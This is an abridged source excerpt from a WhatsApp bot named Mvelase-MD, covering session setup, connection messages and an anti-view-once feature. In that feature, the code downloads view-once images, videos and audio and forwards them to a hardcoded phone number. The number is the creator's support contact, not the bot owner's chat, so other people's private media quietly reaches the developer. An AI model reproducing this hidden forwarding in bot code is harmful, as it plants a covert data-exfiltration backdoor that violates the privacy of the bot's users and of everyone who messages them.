/*
Project Name : Mvelase-MD
Creator      : Khulekani Dube ( Mvelase SIR )
Repo         : https//github.com/khulekanidube/Mvelase-MD
Support      : wa.me/263711337094
*/
/
...
const sessdata = config.SESSION_ID.replace("Mvelase-MD~", '');
...
console.log("Mvelase Session downloaded ✅")
})})}
  ...
  console.log("[❄️] Mvelase MD Connecting to WhatsApp ♻️...");
  ...
  console.log('[❄️] Mvelase MD connected to whatsapp ✅')
  
  let up = `*𝐻𝑖 𝑂𝑤𝑛𝑒𝑟, 𝐶𝑜𝑛𝑔𝑟𝑎𝑡𝑠 𝑴𝒗𝒆𝒍𝒂𝒔𝒆 𝑀𝐷 𝐶𝑜𝑛𝑛𝑒𝑐𝑡𝑒𝑑 𝑆𝑢𝑐𝑐𝑒𝑠𝑠𝑓𝑢𝑙𝑙𝑦! 🚀* \n\n> 𝐷𝑎𝑟𝑘, Cold, 𝐻𝑒𝑎𝑟𝑡, Fast & Rich Loaded With Features, 𝑴𝒗𝒆𝒍𝒂𝒔𝒆 𝑾𝑨 𝑩𝒐𝒕.\n\n *_Thanks for using 𝙈𝙑𝙀𝙇𝘼𝙎𝙀 𝙈𝘿_* \n\n> Join WhatsApp Channel :- 🛠️\n \nhttps://whatsapp.com/channel/0029VajdbH511ulTyGysZq17\n\n- *ʏᴏᴜʀ ʙᴏᴛ ᴘʀᴇFɪx :*  ${prefix}\n\nDont forget to  star our repo☺ \n\nhttps://github.com/khulekanidube/Mvelase-MD\n\n> ᴊᴏɪɴ ᴍᴠᴇʟᴀsᴇ ᴍᴅ sᴜᴘᴘᴏʀᴛ ᴄʜᴀɴɴᴇʟ 🚀`;
  conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/7a63r4.png` }, caption: up })
  }
  })
 conn.ev.on('creds.update', saveCreds)  
  ...
  if (jawadik && config.ANTI_VV === "true") {
    ...
    return conn.sendMessage("263711337094@s.whatsapp.net", { image: { url: anu }, caption: cap }, { quoted: mek });
    ...
    return conn.sendMessage("263711337094@s.whatsapp.net", { video: { url: anu }, caption: cap }, { quoted: mek });
  } if (jawadik.message.audioMessage) {
    let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.audioMessage);
    return conn.sendMessage("263711337094@s.whatsapp.net", { audio: { url: anu }, caption: cap }, { quoted: mek });
  }
  }
...
if (isCmd && config.READ_CMD === "true") {
  ...
  if(senderNumber.includes("263711337094")){
  if(isReact) return
  m.react("🧑‍💻")
  }
...
if (!isReact && senderNumber === botNumber) {
  ...
  /*
  app.get("/", (req, res) => {
  res.send("[🤖] MVELASE MD BOT ONLINE ✅");
  });
  */
